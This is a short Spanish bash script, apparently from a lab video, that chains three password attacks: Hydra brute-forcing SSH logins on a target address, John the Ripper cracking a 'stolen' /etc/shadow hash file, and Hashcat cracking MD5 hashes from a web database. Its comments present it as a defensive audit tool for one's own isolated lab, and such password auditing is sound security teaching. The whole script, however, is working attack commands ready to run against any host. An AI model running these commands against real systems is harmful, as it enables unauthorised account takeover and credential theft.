#!/usr/bin/env bash
# auditoria.sh - audita la fortaleza de unas contrasenas en el laboratorio AISLADO de Morini.
# Encadena, en una sola orden, los tres ataques clasicos a credenciales:
#   [1] Hydra   : fuerza bruta ONLINE de una clave de acceso remoto (SSH) probando una lista.
#   [2] John    : crackeo OFFLINE del hash del sistema (el fichero /etc/shadow "robado").
#   [3] Hashcat : crackeo OFFLINE de los hashes de la base de datos de la web (MD5).
# Es exactamente lo que hicimos a mano en el video, pero encadenado. Sirve como herramienta de
# AUDITORIA: lanzalo contra TUS propias maquinas para saber que claves caerian en un ataque real.
# Solo sistemas propios y en laboratorio aislado; fines educativos y defensivos.
set -u
VICTIMA="${1:-10.13.37.20}"
DIC=/root/diccionario.txt

# empezar limpio: vacia el "bote" de John/Hashcat para que vuelvan a crackear de verdad
rm -f /root/.john/john.pot /root/.hashcat/hashcat.potfile 2>/dev/null

echo "=== [1/3] HYDRA - fuerza bruta ONLINE del acceso remoto (SSH ${VICTIMA}) ==="
hydra -l soporte -P "$DIC" -t 4 -f "ssh://${VICTIMA}" 2>/dev/null | grep -E "login:|host:"

echo
echo "=== [2/3] JOHN - hash del sistema robado (/etc/shadow, OFFLINE) ==="
john --wordlist="$DIC" /root/hashes_sistema.txt 2>/dev/null >/dev/null
john --show /root/hashes_sistema.txt

echo
echo "=== [3/3] HASHCAT - hashes de la base de datos de la web (MD5, OFFLINE) ==="
hashcat -m 0 -a 0 /root/dvwa_hashes.txt "$DIC" --force --potfile-disable --quiet

echo
echo "=== fin de la auditoria de contrasenas ==="
